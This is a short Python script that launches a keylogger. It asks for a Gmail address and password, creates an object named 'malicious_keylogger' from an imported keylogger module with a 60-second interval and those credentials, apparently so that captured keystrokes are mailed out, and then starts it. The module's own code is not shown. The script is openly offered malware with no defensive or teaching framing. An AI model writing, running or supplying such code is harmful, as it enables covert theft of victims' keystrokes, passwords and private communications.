
#!/usr/bin/env python



# Initialize / create keylogger
import keylogger
gmail=input("Enter your Gmail")
password=input("Enter your password")

malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, gmail, password)

# Execute Keylogger

malicious_keylogger.start()